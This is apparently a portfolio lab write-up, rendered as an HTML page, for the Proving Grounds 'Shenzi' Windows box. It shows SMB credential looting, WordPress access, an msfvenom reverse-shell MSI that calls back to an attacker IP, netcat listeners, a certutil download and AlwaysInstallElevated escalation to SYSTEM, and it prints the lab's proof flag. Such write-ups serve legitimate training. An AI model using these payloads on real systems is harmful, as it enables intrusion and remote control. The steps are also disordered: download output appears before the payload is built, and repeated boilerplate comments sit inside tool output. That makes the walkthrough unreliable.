@@ -1,0 +1,291 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab involves exploiting credentials found in an open SMB share to gain access to a Wordpress site, which is used to upload a PHP reverse shell for initial access. Learners will escalate privileges using an insecure registry configuration (AlwaysInstallElevated) to install a malicious MSI package and obtain SYSTEM-level access. The lab highlights enumeration, web exploitation, and registry-based privilege escalation techniques."><title>Proving Grounds: Shenzi</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Windows</span><h1>Proving Grounds: Shenzi</h1><p>This lab involves exploiting credentials found in an open SMB share to gain access to a Wordpress site, which is used to upload a PHP reverse shell for initial access. Learners will escalate privileges using an insecure registry configuration (AlwaysInstallElevated) to install a malicious MSI package and obtain SYSTEM-level access. The lab highlights enumeration, web exploitation, and registry-based privilege escalation techniques.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#overview">Overview</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#scenario">Scenario</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<h2 id="overview">Overview</h2>
+<p>You will discover exposed credentials on an open SMB file share, enabling you to upload a PHP reverse shell to this lab for initial access. Following this, you will exploit an insecure registry configuration to install .msi packages with elevated privileges. This exercise enhances your skills in credential exploitation and privilege escalation through misconfigurations.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Enumerate open SMB shares and retrieve sensitive information, such as credentials, from accessible files.</li>
+<li>Use discovered credentials to gain access to a Wordpress administration panel.</li>
+<li>Upload a PHP reverse shell through the Wordpress theme editor to achieve initial access.</li>
+<li>Enumerate registry settings to identify the AlwaysInstallElevated misconfiguration.</li>
+<li>Create and deploy a malicious MSI package to escalate privileges to SYSTEM.</li>
+</ul>
+<h2 id="scenario">Scenario</h2>
+<p>This lab involves exploiting credentials found in an open SMB share to gain access to a Wordpress site, which is used to upload a PHP reverse shell for initial access. Learners will escalate privileges using an insecure registry configuration (AlwaysInstallElevated) to install a malicious MSI package and obtain SYSTEM-level access. The lab highlights enumeration, web exploitation, and registry-based privilege escalation techniques.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ smbclient -N -L ////192.168.110.55//
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+# Execute the next evidence-gathering step in the authorized lab.
+
+        IPC$            IPC       Remote IPC
+        Shenzi          Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.110.55 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/shenzi]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ smbclient -N //192.168.110.55/Shenzi
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu May 28 11:45:09 2020
+  ..                                  D        0  Thu May 28 11:45:09 2020
+  passwords.txt                       A      894  Thu May 28 11:45:09 2020
+  readme_en.txt                       A     7367  Thu May 28 11:45:09 2020
+  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 11:45:09 2020
+  why.tmp                             A      213  Thu May 28 11:45:09 2020
+  xampp-control.ini                   A      178  Thu May 28 11:45:09 2020
+
+                12941823 blocks of size 4096. 4638515 blocks available
+smb: \&gt; get passwords.txt
+getting file \passwords.txt of size 894 as passwords.txt (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec)
+smb: \&gt; exit</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/shenzi]
+# Read the file contents for useful configuration or credential data.
+
+└─$ cat passwords.txt     
+### XAMPP Default Passwords ###
+
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+
+2) FileZilla FTP:
+
+   [ You have to create a new user on the FileZilla Interface ] 
+
+3) Mercury (not in the USB &amp; lite version): 
+
+   Postmaster: Postmaster (postmaster@localhost)
+   Administrator: Admin (admin@localhost)
+
+   User: newuser  
+   Password: wampp 
+
+4) WEBDAV: 
+
+   User: xampp-dav-unsecure
+   Password: ppmax2011
+   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
+   For activation please comment out the httpd-dav.conf and
+   following modules in the httpd.conf
+   
+   LoadModule dav_module modules/mod_dav.so
+   LoadModule dav_fs_module modules/mod_dav_fs.so  
+   
+   Please do not forget to refresh the WEBDAV authentification (users and passwords).     
+
+5) WordPress:
+
+   User: admin
+   Password: FeltHeadwallWight357</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Discover application paths and files that may expand the attack surface.
+
+└─$ gobuster dir -u http://192.168.110.55/shenzi/ -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+# Discover application paths and files that may expand the attack surface.
+
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.110.55/shenzi/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.hta                 (Status: 403) [Size: 1046]
+.htaccess            (Status: 403) [Size: 1046]
+.htpasswd            (Status: 403) [Size: 1046]
+0                    (Status: 301) [Size: 0] [--&gt; http://192.168.110.55/shenzi/0/]
+admin                (Status: 302) [Size: 0] [--&gt; http://192.168.110.55/shenzi/wp-admin/]
+atom                 (Status: 301) [Size: 0] [--&gt; http://192.168.110.55/shenzi/feed/atom/]
+aux                  (Status: 403) [Size: 1046]
+com1                 (Status: 403) [Size: 1046]
+com2                 (Status: 403) [Size: 1046]
+com3                 (Status: 403) [Size: 1046]
+con                  (Status: 403) [Size: 1046]
+dashboard            (Status: 302) [Size: 0] [--&gt; http://192.168.110.55/shenzi/wp-admin/]
+Progress: 1385 / 4613 (30.02%)^C</code></pre><ul>
+<li><p>Using the wordpress credentials we are able to login</p>
+</li>
+<li><p>Navigating to <code>http://192.168.110.55/shenzi/themes/twentytwenty/404.php</code> we get out shell</p>
+</li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+****  Online  ****
+  000000  ...
+  027000
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\shenzi\Desktop&gt;.\shell.msi
+
+C:\Users\shenzi\Desktop&gt;</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># The scan output identifies the target&#39;s exposed services and their versions.
+
+Nmap scan report for 192.168.110.55
+Host is up (0.019s latency).
+Not shown: 65520 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.110.55/dashboard/
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+| http-title: Welcome to XAMPP
+|_Requested resource was https://192.168.110.55/dashboard/
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.98%E=4%D=7/2%OT=21%CT=1%CU=39129%PV=Y%DS=4%DC=T%G=Y%TM=6A46ACE2
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TS=U)SEQ(SP=105%GCD=1%IS
+OS:R=109%TS=U)SEQ(SP=105%GCD=1%ISR=10B%TS=U)SEQ(SP=107%GCD=1%ISR=10A%TS=U)O
+OS:PS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW8NNS%O6
+OS:=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=
+OS:Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q
+OS:=)T2(R=N)T3(R=N)T4(R=N)T5(R=N)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-07-02T18:24:22
+|_  start_date: N/A</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.200 LPORT=4444 -f msi -o shell.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+Saved as: shell.msi
+                                                                                                                               
+┌──(kali㉿kali)-[~/offsec/shenzi]
+# Run the helper or analysis script used in this lab step.
+
+└─$ python3 -m http.server 80                                                            
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.110.55 - - [02/Jul/2026 15:05:51] &quot;GET /shell.msi HTTP/1.1&quot; 200 -
+192.168.110.55 - - [02/Jul/2026 15:05:51] &quot;GET /shell.msi HTTP/1.1&quot; 200 -</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.45.200] from (UNKNOWN) [192.168.110.55] 52413
+SOCKET: Shell has connected! PID: 8832
+Microsoft Windows [Version 10.0.19042.1526]
+(c) Microsoft Corporation. All rights reserved.
+
+# Confirm the identity of the current session.
+
+C:\xampp\htdocs\shenzi&gt;whoami
+shenzi\shenzi
+
+# Review the Windows privileges available to the current account.
+
+C:\xampp\htdocs\shenzi&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+C:\xampp\htdocs\shenzi&gt;</code></pre><ul>
+<li>There is <code>AlwaysInstallElevated</code> privilege for the user</li>
+<li>This means that .msi files (Microsoft Software Installer) are automatically installed with Administrative privileges. That’s our solution. All we need to do to elevate our privileges is to create a malicious MSI file, then transfer and install it.</li>
+</ul>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code>─(kali㉿kali)-[~/offsec/shenzi]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.200] from (UNKNOWN) [192.168.110.55] 52450
+Microsoft Windows [Version 10.0.19042.1526]
+(c) Microsoft Corporation. All rights reserved.
+
+# Confirm the identity of the current session.
+
+C:\WINDOWS\system32&gt;whoami
+# Confirm the identity of the current session.
+
+whoami
+nt authority\system
+
+# Read the file contents for useful configuration or credential data.
+
+C:\WINDOWS\system32&gt;type C:\Users\Administrators\Desktop\proof.txt
+# Read the file contents for useful configuration or credential data.
+
+type C:\Users\Administrators\Desktop\proof.txt
+The system cannot find the path specified.
+
+# Read the file contents for useful configuration or credential data.
+
+C:\WINDOWS\system32&gt;type C:\Users\Administrator\Desktop\proof.txt
+# Read the file contents for useful configuration or credential data.
+
+type C:\Users\Administrator\Desktop\proof.txt
+72a686b7786f9d7a6028db1b2eacc4c0</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
